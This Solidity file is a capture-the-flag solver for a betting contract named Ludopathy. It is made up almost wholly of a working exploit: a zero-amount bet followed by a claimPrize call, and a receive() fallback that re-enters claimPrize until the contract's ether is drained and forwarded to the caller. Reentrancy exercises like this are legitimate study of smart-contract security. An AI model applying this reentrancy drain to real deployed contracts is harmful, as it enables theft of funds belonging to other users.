// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFSolver.sol";
import "src/Challenge.sol";
import "src/Ludopathy.sol";

contract Solve is CTFSolver {
    function solve(address _challenge, address player) internal override {
        Challenge challenge = Challenge(_challenge);
        Ludopathy ludopathy = challenge.ludopathy();

        LudopathyExploit exploit = new LudopathyExploit(ludopathy);
        exploit.attack();
    }
}

contract LudopathyExploit {
    Ludopathy public ludopathy;

    constructor(Ludopathy _ludopathy) {
        ludopathy = _ludopathy;
    }

    function attack() external {
        uint96[] memory nums = new uint96[](1);
        nums[0] = 999;
        uint200[] memory amts = new uint200[](1);
        amts[0] = 0;
        ludopathy.largeBet(nums, amts);

        ludopathy.claimPrize(1);

        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        if (address(ludopathy).balance >= 1.5 ether) {
            ludopathy.claimPrize(1);
        }
    }
}
